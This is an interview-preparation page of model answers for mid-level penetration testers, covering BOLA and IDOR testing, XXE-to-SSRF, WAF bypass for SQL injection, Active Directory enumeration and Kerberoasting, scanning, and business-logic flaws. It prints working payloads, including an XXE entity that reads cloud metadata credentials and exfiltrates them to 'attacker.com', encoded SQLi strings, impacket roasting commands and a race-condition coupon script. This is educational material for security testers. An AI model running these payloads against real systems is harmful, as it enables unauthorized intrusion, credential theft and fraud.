# Interview Q&A — Mid-Level

!!! tip "Mid-Level Interview Reality"
    At this level, interviewers expect you to have real engagement stories and the ability to reason through novel scenarios. Answers starting with "In a recent assessment..." carry significantly more weight than textbook explanations. The questions here extend beyond the Q&A already embedded in each module.

---

### Q1. Walk me through how you'd test an API for BOLA vulnerabilities systematically.

??? success "Model Answer to Give"
    "BOLA testing requires two test accounts at minimum — let's call them User A and User B. Here's my systematic approach:

    Step 1: Authenticate as User A and map every API endpoint that returns or accepts object references — order IDs, user IDs, document IDs, account numbers, anything that identifies a specific resource.

    Step 2: Create the same types of resources as User B. Now I have User A's resources and User B's resources.

    Step 3: With User A's token, attempt to access User B's resources by substituting object IDs:
    ```
    # User A's order: GET /api/orders/A_ORDER_ID → 200
    # User B's order: GET /api/orders/B_ORDER_ID → should be 403, test if it's 200
    ```

    Step 4: Check all HTTP methods, not just GET. Sometimes DELETE or PUT is unprotected even when GET is:
    ```
    DELETE /api/orders/B_ORDER_ID with User A token
    PUT /api/orders/B_ORDER_ID with User A token
    PATCH /api/orders/B_ORDER_ID with User A token
    ```

    Step 5: Inspect the full JSON responses — not just the top-level ID, but nested references. If an order response contains `invoice_id`, `shipping_address_id`, `payment_method_id`, test those IDs for BOLA independently.

    Step 6: Non-sequential IDs (UUIDs) don't eliminate BOLA — they just make guessing harder. Check if any other endpoint leaks another user's UUID. For example: a shared activity feed, search results, a notification that references another user's object.

    Tools: Burp Suite with Autorize extension automates this — it replays every authenticated request with a different user's token and flags differences in response codes. But I always supplement with manual testing because Autorize has false negatives on complex scenarios."

---

### Q2. Describe a scenario where you'd use XXE to perform SSRF.

??? success "Model Answer to Give"
    "XXE and SSRF intersect when XML with external entity processing is used to make server-side HTTP requests — which is effectively SSRF via the XML parser.

    The scenario: the application accepts XML input in a request body or file upload. If external entity processing is enabled, I can define an entity that references an HTTP URL instead of a file:

    ```xml
    <?xml version='1.0' encoding='UTF-8'?>
    <!DOCTYPE foo [
      <!ENTITY xxe SYSTEM 'http://169.254.169.254/latest/meta-data/'>
    ]>
    <order>
      <data>&xxe;</data>
    </order>
    ```

    The XML parser sees the entity reference, makes an HTTP request to the EC2 metadata service, and includes the response in the parsed document. If the application returns parsed data in the response, I read the metadata — potentially including IAM role credentials.

    For blind XXE-SSRF (where the response isn't reflected):
    ```xml
    <!DOCTYPE foo [
      <!ENTITY % file SYSTEM 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'>
      <!ENTITY % oob '<!ENTITY &#x25; exfil SYSTEM "http://attacker.com/?data=%file;">'>
      %oob;
      %exfil;
    ]>
    ```
    This triggers an out-of-band HTTP request to my server with the metadata contents.

    SVG file uploads are a particularly useful vector — SVG is XML, and many image processing libraries parse SVG with external entities enabled. Submitting an SVG with XXE payload through an image upload feature can bypass WAFs focused on JSON/form inputs.

    Finding it: any XML-accepting endpoint, SOAP services (XML by design), file upload accepting XML-based formats (DOCX, XLSX, SVG, XSD). Test with a simple entity pointing to a Burp Collaborator domain — DNS interaction confirms the parser is making outbound requests."

---

### Q3. A web application is protected by a WAF that blocks SQLi patterns. How do you proceed?

??? success "Model Answer to Give"
    "WAF bypass requires understanding what the WAF is matching on and finding representations of the payload that the WAF misses but the database processes identically.

    My approach — systematic, not just trying random bypasses:

    **First, understand what's being blocked:**
    ```sql
    ' → blocked
    1 OR 1=1 → blocked
    UNION SELECT → blocked
    ```
    The WAF is doing string matching. My goal is to represent the same SQL in a form it doesn't match.

    **Encoding bypasses:**
    ```sql
    # URL double-encoding (WAF decodes once, backend decodes again)
    %27 = '  (single quote, URL encoded)
    %2527 = %27 (double encoded, WAF sees %2527, backend sees ')

    # Unicode encoding
    ʼ (Unicode apostrophe) → some databases normalize to '
    
    # Hex encoding (MySQL accepts this)
    SELECT 0x61646d696e  -- 'admin' in hex, no quotes needed
    ```

    **Comment insertion (breaks keyword matching):**
    ```sql
    UN/**/ION SEL/**/ECT 1,2,3--
    UNI%0dON SEL%0dECT  -- newlines
    /*!UNION*/ /*!SELECT*/ 1,2,3--  -- MySQL conditional comments
    ```

    **Case variation:**
    ```sql
    uNiOn SeLeCt
    UNION%20SELECT (space as %20 vs literal space)
    ```

    **Alternative syntax:**
    ```sql
    -- Instead of spaces:
    SELECT/**/username/**/FROM/**/users
    (SELECT(username)FROM(users))
    
    -- Avoid quotes around strings:
    WHERE username=0x61646d696e  -- hex for 'admin'
    WHERE username=CHAR(97,100,109,105,110)  -- admin via CHAR()
    ```

    **sqlmap tamper scripts** automate many of these:
    ```bash
    sqlmap -u 'http://target.com/page?id=1' \
      --tamper=space2comment,between,randomcase,charunicodeescape \
      --random-agent --delay=2
    ```

    If the WAF is a proper ML-based WAF (Cloudflare, Imperva), simple encoding won't work. I'd then look for: second-order injection, out-of-band injection channels, time-based blind injection with heavily obfuscated payloads, or move to other vulnerability classes entirely."

---

### Q4. Explain how you test for insecure direct object references in an application that uses GUIDs instead of sequential IDs.

??? success "Model Answer to Give"
    "UUIDs/GUIDs replace the easy attack vector (increment id=1 to id=2) but don't eliminate BOLA — they just make it harder to guess object references. My approach:

    **Identify UUID leakage elsewhere in the application:**
    Applications that use GUIDs for direct references often leak them through other mechanisms:
    - Shared resource links (email notifications with full UUID in URL)
    - Search results that include other users' objects
    - Activity feeds or audit logs visible to multiple users
    - API responses that include GUIDs of related objects you shouldn't access directly
    - Error messages that reveal object existence

    **Example — email notification leak:**
    Application sends 'Your invoice is ready' email with `https://app.com/invoice/3f2504e0-4f89-11d3-9a0c-0305e82c3301`. That UUID is User B's invoice. Can User A access it with their token? Test it.

    **API response chaining:**
    ```
    GET /api/account → {"id": "UUID_A", "manager_id": "UUID_M", "team_id": "UUID_T"}
    # Try directly accessing:
    GET /api/users/UUID_M → another user's profile
    GET /api/teams/UUID_T → team data
    ```

    **Prediction for time-based UUIDs:**
    UUID v1 is time-based — the UUID encodes a timestamp and MAC address. If you know when an object was created, you can reconstruct the UUID. Tools like `uuid-tool` can help. UUID v4 is random — much harder.

    **Fuzzing with tools:**
    Collect all UUIDs you legitimately have access to. Use these as a corpus for fuzzing similar-looking UUIDs (same prefix patterns for time-based UUIDs). Burp Intruder with UUID wordlists.

    In reporting: BOLA with UUIDs is still a High finding because: (1) GUIDs are not access control — they're obscurity, (2) UUID leakage is likely somewhere in the application, (3) the proper fix is server-side authorization check, not obscure IDs."

---

### Q5. You're doing an internal assessment and you have a low-privilege domain user. No accounts have been cracked yet. What are your first enumeration steps?

??? success "Model Answer to Give"
    "Low-privilege domain user is actually a surprisingly powerful starting position in AD — authenticated LDAP enumeration reveals the entire domain structure.

    First: situational awareness.
    ```powershell
    whoami /all           # My user, groups, privileges
    hostname              # Machine I'm on
    ipconfig /all         # Network interfaces
    echo %userdomain%     # Domain name
    net user /domain      # All domain users
    net group /domain     # All domain groups
    ```

    Then: BloodHound collection.
    ```bash
    # From Linux with creds (less conspicuous than running SharpHound on-host):
    bloodhound-python -d corp.local -u myuser -p mypass -c All -ns dc-ip
    ```
    This gives me the full AD attack path graph. I immediately run:
    - 'Find Shortest Paths to Domain Admins'
    - 'Find Kerberoastable Users'
    - 'Find AS-REP Roastable Users'
    - 'Find Computers where Domain Users are Local Admin'
    - 'Find Principals with DCSync Rights'

    Simultaneously: Kerberoast and AS-REP roast.
    ```bash
    GetUserSPNs.py -dc-ip dc_ip corp.local/myuser:mypass -request -outputfile kerberoast.txt
    GetNPUsers.py corp.local/myuser:mypass -dc-ip dc_ip -request -outputfile asrep.txt
    ```
    Send both to hashcat immediately — cracking can happen in background while I continue.

    User description check — often overlooked but highly productive:
    ```powershell
    Get-DomainUser | Where-Object {$_.Description -ne $null} | Select samaccountname, description
    ```
    Admins sometimes store passwords in user description fields.

    Then: look for misconfigurations in ACLs, GPOs, and group memberships that BloodHound highlights. If BloodHound shows my user has GenericWrite on any object, that's an immediate escalation path without cracking any password."

---

### Q6. What is the difference between authenticated and unauthenticated vulnerability scanning, and when does each apply?

??? success "Model Answer to Give"
    "The difference is whether the scanner is given credentials to log into the target system and perform local checks.

    **Unauthenticated scanning:** The scanner probes from the network — sending packets, making service requests, checking banners and responses. It can detect: open ports and services, network-level vulnerabilities (EternalBlue, Heartbleed, exposed admin panels), outdated service banners, TLS misconfigurations. It misses: unpatched OS packages, misconfigured local settings, installed software versions, local user accounts.

    In practice, unauthenticated scanning finds maybe 30% of what authenticated scanning finds on the same target. It's also prone to higher false-positive rates because it's inferring vulnerability from banners and response patterns rather than confirmed versions.

    **Authenticated scanning:** The scanner is given OS-level credentials (SSH key for Linux, domain credentials or local admin for Windows) and logs in to check installed package versions, running services, local configuration, patch state, and user accounts. This is a 'local check' — much more accurate and comprehensive.

    **When unauthenticated scanning is appropriate:**
    - External perimeter assessment — the scanner simulates an attacker with no prior access
    - When credentials can't be provided (client restriction)
    - Web application scanning (WAF testing, endpoint discovery)
    - ASV scans for PCI compliance — external scan perspective

    **When authenticated scanning is required:**
    - Internal vulnerability assessments — to accurately identify patch gaps
    - Compliance assessments (PCI-DSS, ISO 27001 internal audit)
    - Pre-migration hardening validation
    - Whenever the client wants a complete vulnerability picture

    I always recommend authenticated scanning for internal assessments and explain the accuracy gap to clients who push back due to credential concerns. For those clients, I propose a locked-down read-only service account with minimum permissions and offer to supervise the scanning to address trust concerns."

---

### Q7. How would you approach finding business logic vulnerabilities, and give me an example of one you've found or that's commonly found?

??? success "Model Answer to Give"
    "Business logic vulnerabilities require understanding what the application is supposed to do, then systematically testing whether it can be made to deviate.

    My approach:
    1. Understand the business flow completely — step through every feature as a normal user, map multi-step processes
    2. Ask: what if a user skips a step? Repeats a step? Does steps out of order?
    3. What if numeric inputs are negative, zero, or very large?
    4. What if the same action is performed concurrently (race condition)?
    5. What if a parameter that the UI treats as read-only is modified directly in the request?

    A commonly found example — coupon code validation:
    Application flow: add coupon → coupon is validated → discount applied → order placed.
    The check: 'has coupon been used?' happens at validation, then marked used after payment.

    Race condition attack: send 20 concurrent requests to apply the coupon before any single one marks it used. All 20 read 'coupon not used,' all 20 apply the discount. One coupon used 20 times.

    Test:
    ```python
    import concurrent.futures, requests
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as ex:
        futures = [ex.submit(requests.post, 'https://shop.com/apply-coupon',
                            json={'code':'SAVE50'}, cookies={'s': token})
                  for _ in range(20)]
        for f in futures:
            print(f.result().status_code, f.result().json())
    ```

    Another common one — price manipulation. The UI shows a price, user adds item to cart, checkout happens. If the item price appears in the request body:
    ```json
    POST /checkout
    {"items": [{"id": 42, "qty": 1, "price": 999.99}]}
    ```
    Change `price` to `0.01` — if the server trusts it, you buy at a penny.

    These vulnerabilities are completely invisible to automated scanners because they require understanding the business context. A scanner sees valid HTTP requests and valid responses. Only a human who understands what the application should do can recognize that the response represents a business logic failure."

---

!!! tip "Practice Recommendation"
    For mid-level interviews: do 2-3 HackTheBox machines per week (Active, Forest, Resolute for AD) and at least one PortSwigger Advanced topic per week (HTTP request smuggling, prototype pollution, OAuth). The ability to describe specific machine solutions demonstrates you're actively practicing, not just studying theory.
